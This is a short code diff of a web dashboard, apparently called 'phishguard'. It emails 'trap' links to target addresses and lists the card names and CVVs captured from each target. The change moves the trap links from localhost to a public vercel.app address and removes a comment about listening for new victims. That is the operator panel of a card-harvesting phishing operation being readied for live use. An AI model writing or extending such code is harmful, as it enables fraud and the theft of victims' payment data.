@@ -35,8 +35,7 @@ export default function Dashboard() {
   const { error } = await supabase.from('targets').insert([{ email: newEmail }]);
   
   if (!error) {
-    // 2. Trigger the Email API
-    const trapUrl = `http://localhost:3000/trap?email=${newEmail}`;
+    const trapUrl = `${window.location.origin}/trap?email=${newEmail}`;
     
     try {
       await fetch('/api/send', {
@@ -55,8 +54,6 @@ export default function Dashboard() {
     alert("Target already exists or Database error.");
   }
 };
-
-  // Auto-refresh every 5 seconds to "listen" for new victims
   useEffect(() => {
     if (isAuthenticated) {
       fetchData()
@@ -109,7 +106,7 @@ export default function Dashboard() {
                         <p><strong>NAME:</strong> {t.card_name} | <strong>CVV:</strong> {t.cvv}</p>
                       </div>
                     ) : (
-                      <span className="text-[10px] text-slate-400 italic font-mono">http://localhost:3000/trap?email={t.email}</span>
+                      <span className="text-[10px] text-slate-400 italic font-mono">https://phishguard-one.vercel.app//trap?email={t.email}</span>
                     )}
                   </td>
                   <td className="px-8 py-5 text-right">
